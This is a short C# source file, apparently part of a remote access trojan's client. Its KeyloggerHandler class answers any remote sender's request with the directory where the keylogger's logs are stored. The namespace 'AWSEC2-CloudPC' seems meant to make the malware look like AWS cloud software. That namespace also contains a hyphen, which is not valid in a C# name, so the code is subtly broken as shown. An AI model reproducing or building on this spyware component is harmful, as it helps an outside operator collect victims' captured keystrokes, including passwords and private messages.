using AWSEC2-CloudPC.Client.Config;
using AWSEC2-CloudPC.Common.Messages;
using AWSEC2-CloudPC.Common.Networking;

namespace AWSEC2-CloudPC.Client.Messages
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
        }
    }
}
